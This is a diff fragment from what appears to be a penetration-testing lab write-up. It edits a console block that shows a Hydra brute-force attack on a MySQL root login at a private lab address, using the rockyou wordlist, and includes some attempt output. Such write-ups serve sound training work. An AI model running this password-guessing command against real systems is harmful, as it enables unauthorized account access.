@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
 ```
 
 ```console
-root@kali:/OSCPv3/offsec/PyExp/cve-2016-6662# hydra -f -T 120 -t 120 -l root -P /usr/share/wordlists/rockyou.txt 192.168.58.118 mysql -v -V
+root@kali:/OSCPv3/offsec/PyExp# hydra -f -T 120 -t 120 -l root -P /usr/share/wordlists/rockyou.txt 192.168.58.118 mysql -v -V
 ...
 [VERBOSE] using default db 'mysql'
 [ATTEMPT] target 192.168.58.118 - login "root" - pass "princess101" - 9988 of 0 [child 14344399] (0/2)
